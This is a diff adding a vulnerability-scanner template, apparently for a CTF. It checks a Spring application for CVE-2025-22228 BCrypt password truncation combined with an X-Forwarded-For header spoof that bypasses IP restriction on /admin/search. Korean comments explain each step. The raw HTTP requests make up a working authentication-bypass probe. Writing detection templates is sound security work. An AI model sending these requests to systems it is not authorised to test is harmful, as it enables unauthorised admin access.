@@ -1,0 +1,61 @@
+id: detect-cve-2025-22228-admin-bypass
+
+info:
+  name: Spring Security BCrypt Truncation & ACL Bypass Detection
+  author: jebeen
+  severity: critical
+  description: |
+    Registers a user, logs in, and attempts to access the /admin/search endpoint 
+    using a truncated password (CVE-2025-22228) and X-Forwarded-For header.
+  tags: ctf, spring, cve, auth-bypass
+
+variables:
+  username: "{{randstr}}"
+  # 72글자의 더미 데이터 (BCrypt 제한 길이)
+  prefix_72: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+  # 가입할 때 쓰는 실제 마지막 글자
+  real_suffix: "A"
+  # 공격할 때 쓰는 가짜 마지막 글자 (이걸로 통과되면 취약점!)
+  fake_suffix: "B"
+
+http:
+  - raw:
+      # [Step 1] 회원가입 (비밀번호: a...aA)
+      - |
+        POST /user/register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username": "{{username}}", "password": "{{prefix_72}}{{real_suffix}}"}
+
+      # [Step 2] 로그인 (정상 비밀번호로 세션 획득)
+      - |
+        POST /user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username": "{{username}}", "password": "{{prefix_72}}{{real_suffix}}"}
+
+      # [Step 3] 취약점 확인 (/admin/search 접근)
+      # 조건 1: X-Forwarded-For 헤더로 IP 우회
+      # 조건 2: 비밀번호 뒷자리를 'B'로 바꿔서 전송 (서버가 72자만 체크하면 통과됨)
+      - |
+        POST /admin/search HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        Content-Type: application/json
+        
+        {"apiKey": "test", "password": "{{prefix_72}}{{fake_suffix}}"}
+
+    # 로그인 후 세션을 유지하기 위해 필수
+    cookie-reuse: true
+    
+    matchers-condition: and
+    matchers:
+      # 세 번째 요청(/admin/search)의 결과 검증
+      - type: dsl
+        dsl:
+          # 200 OK가 나오면 "틀린 비밀번호"와 "외부 IP"를 모두 받아줬다는 뜻 -> 취약함
+          - "status_code_3 == 200"
+          # 오탐 방지를 위해 json 응답인지 확인 (선택사항)
+          - "contains(content_type_3, 'application/json')"
